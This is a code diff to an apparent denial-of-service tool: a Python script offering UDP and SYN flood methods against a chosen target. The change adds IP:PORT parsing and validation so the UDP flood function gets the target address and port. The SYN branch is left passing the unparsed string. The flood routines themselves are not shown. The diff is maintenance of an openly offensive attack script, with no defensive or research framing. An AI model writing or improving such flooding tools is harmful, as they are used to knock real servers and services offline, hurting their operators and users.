@@ -3,6 +3,7 @@ import os
 import sys
 import argparse
 import threading
+import re
 
 os.chdir(os.path.dirname(os.path.realpath(__file__)))
 
@@ -45,6 +46,18 @@ time = args.time
 method = str(args.method).upper()
 target = args.target
 
+# Split target into IP and PORT
+try:
+    target_ip, target_port = target.split(':')
+    target_port = int(target_port)  # Convert port to integer
+except ValueError:
+    print("Error: Target must be in the format IP:PORT")
+    sys.exit(1)
+
+if not re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', target):
+    print("Error: Target must be in the format IP:PORT")
+    sys.exit(1)
+
 if not method or not target or not time:
     parser.print_help()
     sys.exit(1)
@@ -73,8 +86,8 @@ else:
     def other_attack_method():
         if method == "UDP":
             for _ in range(threads):
-                udp_flood(target)  # Call the UDP flood function
-                print(f"[+] Sending packets to {target} using UDP method.")
+                udp_flood((target_ip, target_port))  # Pass as tuple
+                print(f"[+] Sending packets to {target_ip}:{target_port} using UDP method.")
         elif method == "SYN":
             for _ in range(threads):
                 syn_flood(target)  # Call the SYN flood function
